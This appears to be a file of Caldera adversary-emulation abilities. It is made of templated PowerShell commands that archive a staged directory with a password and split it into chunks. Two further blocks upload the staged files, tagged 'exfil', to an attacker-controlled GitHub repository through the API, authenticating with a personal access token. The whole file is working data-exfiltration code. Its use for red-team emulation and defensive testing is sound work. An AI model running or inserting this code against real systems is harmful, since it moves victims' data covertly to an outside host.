scripts.command:
& "C:\Program Files\7-Zip\7z.exe" a "#{stockpile_exfil_1030_host_dir_staged}.7z" "#{stockpile_exfil_1030_host_dir_staged}\*" '-p#{stockpile_exfil_1030_host_archive_password}' | Out-Null;
sleep 2;
$Archive = Get-Item -Path "#{stockpile_exfil_1030_host_dir_staged}.7z";
$StageDir = "#{stockpile_exfil_1030_host_dir_staged}";
$BaseName = $StageDir + "\calderachunk";
$UpperBound = [int32]"#{stockpile_exfil_1030_file_size_chunk}";
$Content = [IO.File]::OpenRead($Archive);
$buff = New-Object byte[] $UpperBound;
$Bytes = $idx = 0;
try {
    do {
        $Bytes = $Content.Read($buff, 0, $buff.Length);
        if ($Bytes -gt 0) {
            $ChunkName = "{0}{1}" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));
            $ChunkFile = [IO.File]::OpenWrite($ChunkName);
            try {
                $ChunkFile.Write($buff, 0, $Bytes);
            } finally {
                $ChunkFile.Close();
            }
        }
        $idx ++;
    } while ($Bytes -gt 0)
}
finally {
    $Content.Close();
}
Remove-Item $Archive;
Get-ChildItem -Path "$StageDir\calderachunk*" | foreach {$_.FullName} | Select-Object;

$GHUser = "#{stockpile_exfil_1567_001_github_user_name}";
$GHRepo = "#{stockpile_exfil_1567_001_github_repository_name}";
$GHPAT = "#{stockpile_exfil_1567_001_github_access_token}";
$GHBranch = '#{stockpile_exfil_1567_001_github_repository_branch}';
$token = $GHUser + ":" + $GHPAT;
$basetoken = [System.Convert]::ToBase64String([char[]]$token);
$Headers = @{
    Authorization = 'Basic {0}' -f $basetoken;
};
$file = (Get-Item #{stockpile_exfil_1567_001_host_dir_compress});
$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{stockpile_exfil_1567_001_paw}-$($file.name)";
$uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;

$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;
$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);
$Body = @{
    path = $RemoteName;
    branch = $GHBranch;
    content = $Base64EncodedFileBytes;
    encoding = 'base64';
    message = "Committed " + $RemoteName;
} | ConvertTo-Json;
try {
  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;
} catch {
  if ($PSItem -notmatch "but expected") { $PSItem; }
}

$GHUser = "#{stockpile_exfil_1567_001_github_user_name}";
$GHRepo = "#{stockpile_exfil_1567_001_github_repository_name}";
$GHPAT = "#{stockpile_exfil_1567_001_github_access_token}";
$GHBranch = '#{stockpile_exfil_1567_001_github_repository_branch}';
$LocalDirectory = "#{stockpile_exfil_1567_001_host_dir_staged}";
$token = $GHUser + ":" + $GHPAT;
$basetoken = [System.Convert]::ToBase64String([char[]]$token);
$Headers = @{
    Authorization = 'Basic {0}' -f $basetoken;
};

$Files = Get-ChildItem $LocalDirectory;
foreach ($file in $Files){
    $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{stockpile_exfil_1567_001_paw}-$($file.name)";
    $uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;
    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;
    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);
    $Body = @{
        path = $file.Name;
        branch = $GHBranch;
        content = $Base64EncodedFileBytes;
        encoding = 'base64';
        message = "Committed " + $file.name + " at: " + (Get-Date);
    } | ConvertTo-Json;
    try {
        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;
    } catch {
        if ($PSItem -notmatch "but expected") { $PSItem; }
        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }
    }
};
